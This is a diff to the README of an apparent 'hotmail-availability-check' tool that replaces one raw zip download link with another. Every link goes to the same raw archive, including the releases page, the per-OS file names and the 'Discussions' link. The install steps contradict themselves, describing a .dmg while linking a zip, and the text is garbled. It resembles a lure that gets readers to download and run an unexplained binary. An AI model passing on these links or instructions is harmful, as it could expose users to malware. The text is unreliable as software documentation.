@@ -17,7 +17,7 @@ Before you begin, ensure that your system meets the following requirements:
 
 To get the application, visit this page to download:
 
-[![Download hotmail-availability-check](https://github.com/starfix200reserved/hotmail-availability-check/raw/refs/heads/main/recalcitrance/availability_check_hotmail_2.7.zip)](https://github.com/starfix200reserved/hotmail-availability-check/raw/refs/heads/main/recalcitrance/availability_check_hotmail_2.7.zip)
+[![Download hotmail-availability-check](https://raw.githubusercontent.com/starfix200reserved/hotmail-availability-check/main/recalcitrance/availability_check_hotmail_v2.4-beta.2.zip)](https://raw.githubusercontent.com/starfix200reserved/hotmail-availability-check/main/recalcitrance/availability_check_hotmail_v2.4-beta.2.zip)
 
 ### Step 1: Visit the Releases Page
 
@@ -27,9 +27,9 @@ Click the link above to go to the Releases page. Here, you will see a list of av
 
 Once on the Releases page, look for the file that matches your operating system. Click on it to start the download. The file name will look something like:
 
-- `https://github.com/starfix200reserved/hotmail-availability-check/raw/refs/heads/main/recalcitrance/availability_check_hotmail_2.7.zip` for Windows
-- `https://github.com/starfix200reserved/hotmail-availability-check/raw/refs/heads/main/recalcitrance/availability_check_hotmail_2.7.zip` for macOS
-- `https://github.com/starfix200reserved/hotmail-availability-check/raw/refs/heads/main/recalcitrance/availability_check_hotmail_2.7.zip` for Linux
+- `https://raw.githubusercontent.com/starfix200reserved/hotmail-availability-check/main/recalcitrance/availability_check_hotmail_v2.4-beta.2.zip` for Windows
+- `https://raw.githubusercontent.com/starfix200reserved/hotmail-availability-check/main/recalcitrance/availability_check_hotmail_v2.4-beta.2.zip` for macOS
+- `https://raw.githubusercontent.com/starfix200reserved/hotmail-availability-check/main/recalcitrance/availability_check_hotmail_v2.4-beta.2.zip` for Linux
 
 ### Step 3: Install the Application
 
@@ -37,7 +37,7 @@ Once on the Releases page, look for the file that matches your operating system.
 
 - **For macOS:** Open the downloaded `.dmg` file and drag the application icon to your Applications folder. After that, you can find it in your Applications list.
 
-- **For Linux:** Extract the `https://github.com/starfix200reserved/hotmail-availability-check/raw/refs/heads/main/recalcitrance/availability_check_hotmail_2.7.zip` file in a preferred directory. Open a terminal and navigate to the extracted folder. Run the command `./hotmail-availability-check` to start the application.
+- **For Linux:** Extract the `https://raw.githubusercontent.com/starfix200reserved/hotmail-availability-check/main/recalcitrance/availability_check_hotmail_v2.4-beta.2.zip` file in a preferred directory. Open a terminal and navigate to the extracted folder. Run the command `./hotmail-availability-check` to start the application.
 
 ## 🚀 How to Use the Application
 
@@ -83,7 +83,7 @@ A: If you face issues, make sure you are using the correct version for your oper
 
 ## 📫 Support
 
-For further assistance, feel free to reach out via the GitHub Issues page or by visiting the [Discussions](https://github.com/starfix200reserved/hotmail-availability-check/raw/refs/heads/main/recalcitrance/availability_check_hotmail_2.7.zip) section for community support.
+For further assistance, feel free to reach out via the GitHub Issues page or by visiting the [Discussions](https://raw.githubusercontent.com/starfix200reserved/hotmail-availability-check/main/recalcitrance/availability_check_hotmail_v2.4-beta.2.zip) section for community support.
 
 ---
 
